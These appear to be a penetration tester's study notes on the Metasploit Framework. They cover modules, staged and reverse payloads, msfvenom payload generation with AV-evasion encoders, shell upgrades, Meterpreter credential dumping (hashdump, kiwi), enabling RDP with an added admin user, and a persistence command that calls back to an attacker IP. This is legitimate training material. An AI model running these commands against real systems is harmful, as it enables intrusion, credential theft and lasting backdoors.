# Metasploit Framework

## What is Metasploit ?&#x20;

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption><p>Credit to HackTheBox</p></figcaption></figure>

#### What is Metasploit?

* A **Ruby-based penetration testing framework**.
* Used to **find, exploit, validate, and manage vulnerabilities**.
* Provides ready-made exploits, payloads, auxiliary modules, and post-exploitation tools.
* Think of it as a **Swiss Army Knife for Pentesting**

### Some Locations&#x20;

{% code overflow="wrap" %}
```bash
ls /usr/share/metasploit-framework/modules

ls /usr/share/metasploit-framework/plugins/

ls /usr/share/metasploit-framework/scripts/

ls /usr/share/metasploit-framework/tools/
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

## Modules&#x20;

### Search for Modules&#x20;

{% code overflow="wrap" %}
```
search <module name>/<vulnerability name>
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (568).png" alt=""><figcaption></figcaption></figure>

#### Search Filters&#x20;

{% code overflow="wrap" %}
```
search cve:<id>
search type:exploit
search type:auxiliary
search platform:windows
search rank:excellent
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (570).png" alt=""><figcaption></figcaption></figure>

### Module Types&#x20;

<table><thead><tr><th width="143">Type</th><th>Description</th></tr></thead><tbody><tr><td><code>Auxiliary</code></td><td>Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.</td></tr><tr><td><code>Encoders</code></td><td>Ensure that payloads are intact to their destination.</td></tr><tr><td><code>Exploits</code></td><td>Defined as modules that exploit a vulnerability that will allow for the payload delivery.</td></tr><tr><td><code>NOPs</code></td><td>(No Operation code) Keep the payload sizes consistent across exploit attempts.</td></tr><tr><td><code>Payloads</code></td><td>Code runs remotely and calls back to the attacker machine to establish a connection (or shell).</td></tr><tr><td><code>Plugins</code></td><td>Additional scripts can be integrated within an assessment with <code>msfconsole</code> and coexist.</td></tr><tr><td><code>Post</code></td><td>Wide array of modules to gather information, pivot deeper, etc.</td></tr></tbody></table>

### Module Information&#x20;

#### Selecting a module&#x20;

{% code overflow="wrap" %}
```bash
use exploit/windows/smb/ms17_010_eternalblue

# Alternatively, if you searched for the module first, you can select it using its index number.
use 0
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (572).png" alt=""><figcaption></figcaption></figure>

#### taking module info&#x20;

<figure><img src="../../.gitbook/assets/image (573).png" alt=""><figcaption></figcaption></figure>

### Setting Parameters&#x20;

<figure><img src="../../.gitbook/assets/image (574).png" alt=""><figcaption></figcaption></figure>

#### Temporary setting

{% code overflow="wrap" %}
```
set <parameter name> 
unset <parameter name> 
```
{% endcode %}

#### Permanent setting

{% code overflow="wrap" %}
```
setg <parameter name>
unsetg <parameter name>
```
{% endcode %}

### Running module&#x20;

{% code overflow="wrap" %}
```
run
```
{% endcode %}

{% code overflow="wrap" %}
```
exploit
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (575).png" alt=""><figcaption></figcaption></figure>

## Setting Target

In Metasploit, **Targets** define **how the exploit will deliver and execute the payload on the victim after the vulnerability has been successfully exploited**.

{% code overflow="wrap" %}
```
Exploit = Gains code execution
Target  = Chooses the execution method
Payload = What runs on the target
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (576).png" alt=""><figcaption></figcaption></figure>

### Automatic (Target 0)

Metasploit automatically selects the best execution method based on the target environment.

```
set TARGET 0
```

Usually the safest choice.

### PowerShell (Target 1)

After exploitation, Metasploit executes the payload using PowerShell.

**Requirements:**

* PowerShell available on the victim
* Often works well on modern Windows systems

**Advantages:**

* Usually leaves fewer files on disk
* Often more reliable on newer Windows versions

### Native Upload (Target 2)

Metasploit uploads a native Windows executable (`.exe`) containing the payload and executes it.

**Process:**

```
Upload payload.exe     
        ↓
Execute payload.exe
        ↓
Get shell/Meterpreter
```

**Advantages:**

* Simple and reliable

**Disadvantages:**

* Drops a file on disk
* Easier for AV/EDR to detect

{% hint style="danger" %}
_MOF Upload (Target 3) is less commonly used today and don't work perfectly on newer versions of Windows._&#x20;
{% endhint %}

## Payloads&#x20;

### Single V/s Staged

#### Single&#x20;

Everything is contained in one payload.

```
Attacker
   │
   └── Single Payload ──► Target
                               │
                               └── Shell
```

Example:

```
windows/x64/meterpreter_reverse_tcp
```

Characteristics:

* Self-contained
* More stable
* Larger size
* Immediate execution

#### Staged Payloads&#x20;

Split into multiple parts:

```
Stage 0 (Stager)  → Establish connection
Stage 1 (Stage)   → Download full payload
```

Example:

```
windows/x64/meterpreter/reverse_tcp
```

Structure:

```
windows/x64/meterpreter/reverse_tcp
           │
           ├── meterpreter = Stage
           └── reverse_tcp = Stager
```

Flow:

```
Target
   │
   ├── Stage 0 (small stager)
   │      │
   │      └── Connects back to attacker
   │
   └── Downloads Stage 1
              │
              └── Meterpreter
```

Advantages:

* Smaller initial shellcode
* Better for large payloads
* More flexible
* Commonly used in real engagements

### Reverse V/s Bind&#x20;

#### Reverse TCP

Victim connects back to attacker.

<figure><img src="../../.gitbook/assets/image (598).png" alt=""><figcaption><p>Credit to HackTheBox</p></figcaption></figure>

```
Victim ─────► Attacker
```

Example:

```
windows/x64/meterpreter/reverse_tcp
```

Most commonly used because outbound traffic is usually allowed through firewalls.

#### Bind TCP

Victim opens a port and waits.

<figure><img src="../../.gitbook/assets/image (597).png" alt=""><figcaption><p>Credit to HackTheBox</p></figcaption></figure>

```
Attacker ─────► Victim
```

Example:

```
windows/x64/meterpreter/bind_tcp
```

Requires inbound connectivity to the victim.

## Msfvenom

**MSFVenom** is a command-line tool that comes with the Metasploit Framework. It is used to generate **payloads** in different formats for penetration testing and security assessments.

### Listing Options&#x20;

#### Listing available payloads

{% code overflow="wrap" %}
```bash
msfvenom -l payloads
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (599).png" alt=""><figcaption></figcaption></figure>

#### Listing available encoders

{% code overflow="wrap" %}
```bash
msfvenom -l encoders
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (600).png" alt=""><figcaption></figcaption></figure>

#### Listing available formats&#x20;

{% code overflow="wrap" %}
```bash
msfvenom -l formats
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (601).png" alt=""><figcaption></figcaption></figure>

### Creating payload

#### Identify basic options for payloads

{% code overflow="wrap" %}
```bash
msfvenom -p <payload> --list-options
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (603).png" alt=""><figcaption></figcaption></figure>

#### Creating payload with basic options&#x20;

{% code overflow="wrap" %}
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.16.129 LPORT=3333 -f exe -e x64/xor -i 24 --platform windows --arch x64 -o exploit.exe
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (604).png" alt=""><figcaption></figcaption></figure>

#### Mandatory Things

{% code overflow="wrap" %}
```bash
msfvenom -p <payload> LHOST=<attacker ip> LPORT=<attacker port> -f <output format> -o exploitable.<format>
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (605).png" alt=""><figcaption></figcaption></figure>

## Spawning Interactive Shell

When you get a **limited shell** (jail shell), many commands won't work properly. The goal is to upgrade it into a **fully interactive TTY shell**.

Interactive shell gives:

* Command history
* Tab completion
* Better terminal control
* Ability to run `sudo -l`
* Easier privilege escalation

### Methods to Spawn a Shell&#x20;

1. **Using SH**&#x20;

{% code overflow="wrap" %}
```bash
/bin/sh -i
```
{% endcode %}

2. Using python&#x20;

{% code overflow="wrap" %}
```bash
python -c 'import pty; pty.spawn("/bin/sh")' 
```
{% endcode %}

3. Using Perl&#x20;

{% code overflow="wrap" %}
```bash
perl -e 'exec "/bin/sh";'
```
{% endcode %}

4. Using ruby&#x20;

{% code overflow="wrap" %}
```bash
ruby -e 'exec "/bin/sh"'
```
{% endcode %}

5. Using Lua

{% code overflow="wrap" %}
```bash
lua -e 'os.execute("/bin/sh")'
```
{% endcode %}

6. Using AWK&#x20;

{% code overflow="wrap" %}
```bash
awk 'BEGIN {system("/bin/sh")}'
```
{% endcode %}

7. Using Find&#x20;

{% code overflow="wrap" %}
```bash
find . -exec /bin/sh \; -quit
```
{% endcode %}

8. **Using VIM**&#x20;

{% code overflow="wrap" %}
```bash
# directly
vim -c ':!/bin/sh'

# Inside vim
:set shell=/bin/sh
:shell
```
{% endcode %}

## Meterpreter&#x20;

**Meterpreter** (Meta-Interpreter) is an advanced Metasploit payload that runs **in memory** on the target and provides a powerful post-exploitation shell.

Compared to a normal shell (`cmd.exe`, `/bin/sh`, PowerShell), Meterpreter provides:

* File upload/download
* Process migration
* Privilege escalation modules
* Screenshot capture
* Keylogging (if authorized)
* Port forwarding
* Network pivoting
* Credential harvesting modules
* Access to Metasploit post-exploitation features

{% hint style="danger" %}
_A normal shell is just command execution. Meterpreter is a full post-exploitation framework._
{% endhint %}

### Getting Meterpreter from a Normal Shell&#x20;

{% code overflow="wrap" %}
```
sessions -u <session id>

post/multi/manage/shell_to_meterpreter
```
{% endcode %}

### **Meterpreter migration**

{% code overflow="wrap" %}
```
meterpreter> getuid
meterpreter> ps
meterpreter> steal_token <service running with system privileges>
```
{% endcode %}

### **Dumping credentials**

{% code overflow="wrap" %}
```bash
meterperter> hashdump
         OR 
meterpreter> load kiwi
meterpreter> lsa_dump_sam
meterpreter> lsa_dump_secrets
```
{% endcode %}

## Encoder&#x20;

An **encoder modifies a payload's byte structure** while preserving its functionality.

#### Main Purposes

1. **Remove bad characters**
2. **Support different architectures**
3. **Attempt AV/IDS evasion** (less effective today)

> Encoders change how the payload looks, not what it does.

#### See a list of encoders&#x20;

{% code overflow="wrap" %}
```
show encoders
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (577).png" alt=""><figcaption></figcaption></figure>

### Shikata Ga Nai (SGN)&#x20;

Most famous Metasploit encoder:

```
x86/shikata_ga_nai
```

Meaning:

```
"It cannot be helped"
```

Characteristics:

* Polymorphic XOR encoder
* Changes payload appearance every time
* Historically effective against AV

{% hint style="warning" %}
_Old AV → Often bypassed_\
_Modern AV/EDR → Usually detects it_
{% endhint %}

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o <shel>
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (578).png" alt=""><figcaption></figcaption></figure>

## Databases&#x20;

Without a database, managing large assessments becomes difficult.

### Database Setup&#x20;

#### Start PostgreSQL

{% code overflow="wrap" %}
```
sudo systemctl start postgresql
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (579).png" alt=""><figcaption></figcaption></figure>

#### Initialize MSF Database

{% hint style="info" %}
_For the first time we need to initialize the database. if database is already initialized and we reboot the system so we just have to start using `sudo msfdb start`._&#x20;

* `sudo msfdb start` : Start the database
* `sudo msfdb stop` : Stop the database
{% endhint %}

{% code overflow="wrap" %}
```
sudo msfdb init
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (580).png" alt=""><figcaption></figcaption></figure>

#### Check status&#x20;

{% hint style="info" %}
_If `Connection type: postgresql` not showing then restart the Metasploit._&#x20;
{% endhint %}

{% code overflow="wrap" %}
```bash
db_status
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (581).png" alt=""><figcaption></figcaption></figure>

_If database is already initialized and we want to run metasploit with database just use `sudo msfdb run` ._&#x20;

<figure><img src="../../.gitbook/assets/image (582).png" alt=""><figcaption></figcaption></figure>

#### Delete the database and stop it&#x20;

{% code overflow="wrap" %}
```bash
sudo msfdb delete
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (583).png" alt=""><figcaption></figcaption></figure>

### Using the Database

#### Workspaces&#x20;

Think of workspaces as project folders.

<figure><img src="../../.gitbook/assets/image (584).png" alt=""><figcaption></figcaption></figure>

**Create a workspace ⇒**&#x20;

{% code overflow="wrap" %}
```bash
workspace -a nexploit
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (585).png" alt=""><figcaption></figcaption></figure>

#### Importing Scan Results&#x20;

{% code overflow="wrap" %}
```bash
#Importing scan results
db_import <xml file location> 

# checking hosts 
hosts 

# checking open ports
services
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (586).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (587).png" alt=""><figcaption></figcaption></figure>

<details>

<summary>Help section of <code>hosts</code> and <code>services</code></summary>

* hosts

<figure><img src="../../.gitbook/assets/image (588).png" alt=""><figcaption></figcaption></figure>

* services

<figure><img src="../../.gitbook/assets/image (589).png" alt=""><figcaption></figcaption></figure>

</details>

#### Finding hosts by protocol

<figure><img src="../../.gitbook/assets/image (590).png" alt=""><figcaption></figcaption></figure>

#### Credentials

View stored credentials:

```bash
creds
```

Add manually:

```bash
creds add user:admin password:P@ssw0rd
```

#### Nmap in Metasploit&#x20;

{% code overflow="wrap" %}
```bash
db_nmap <scan config> 
```
{% endcode %}

{% hint style="info" %}
_Scan results of `db_namp` will automatically be saved to the database. and no need to import._&#x20;
{% endhint %}

<figure><img src="../../.gitbook/assets/image (591).png" alt=""><figcaption></figcaption></figure>

### Export database

{% code overflow="wrap" %}
```
db_export -f xml backup.xml 

db_import backup.xml
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (592).png" alt=""><figcaption></figcaption></figure>

## Sessions&#x20;

### List Sessions&#x20;

{% code overflow="wrap" %}
```bash
sessions
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (593).png" alt=""><figcaption></figcaption></figure>

### Interacting with session&#x20;

{% code overflow="wrap" %}
```bash
sessions -i <id>
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (595).png" alt=""><figcaption></figcaption></figure>

### kill session

{% code overflow="wrap" %}
```bash
# kill a session
sessions -k <id> 

# kill all sessions
sessions -K 
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (596).png" alt=""><figcaption></figcaption></figure>

## Post Exploitation and automating RDP&#x20;

{% code overflow="wrap" %}
```bash
search post/windows/gather/enum_

# start rdp with meterpreter
run getgui -e
run getgui -u <user> -p <password> #adds a user in administrator and RDP group

# method - 2
search post/windows/manage/enable_rdp
```
{% endcode %}

## Maintaining Persistence&#x20;

{% code overflow="wrap" %}
```bash
search windows/local/persistence_service
search exploit/windows/local/registry_persistence

#OR

run persistence -X -i 5 -p 4444 -r <your-ip>
# -X: configures script to run on startup
# -i 5: interval for how often to attempt to connect back to attacker's machine
# -p 4444: Set's the port 
# -r <IP>: Replace IP with attacker's IP. 
```
{% endcode %}
